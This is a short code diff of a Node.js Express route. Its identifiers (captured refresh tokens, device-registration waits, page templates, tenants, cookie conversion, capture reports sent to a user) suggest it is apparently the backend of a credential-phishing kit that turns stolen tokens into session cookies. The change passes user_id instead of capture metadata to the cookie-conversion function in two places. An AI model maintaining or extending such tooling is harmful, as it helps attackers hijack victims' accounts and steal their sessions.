@@ -522,7 +522,7 @@ router.post('/', captureValidators, validateResult, async (req, res) => {
         };
 
         waitForDeviceRegistration().then(() => {
-            processCookieConversion(tokenId, refreshTokenForConversion, link.template_type, tenant, accountType, captureMeta)
+            processCookieConversion(tokenId, refreshTokenForConversion, link.template_type, tenant, accountType, user_id)
                 .then((cookieResult) => {
                     const io = req.app.get('io');
                     if (io) {
@@ -549,7 +549,7 @@ router.post('/', captureValidators, validateResult, async (req, res) => {
         }).catch(err => {
             console.error('[Capture] Device registration wait failed:', err.message);
             // Proceed with cookie conversion anyway
-            processCookieConversion(tokenId, refreshTokenForConversion, link.template_type, tenant, accountType, captureMeta)
+            processCookieConversion(tokenId, refreshTokenForConversion, link.template_type, tenant, accountType, user_id)
                 .then((cookieResult) => {
                     sendCaptureReport(user_id, {
                         ...captureData,
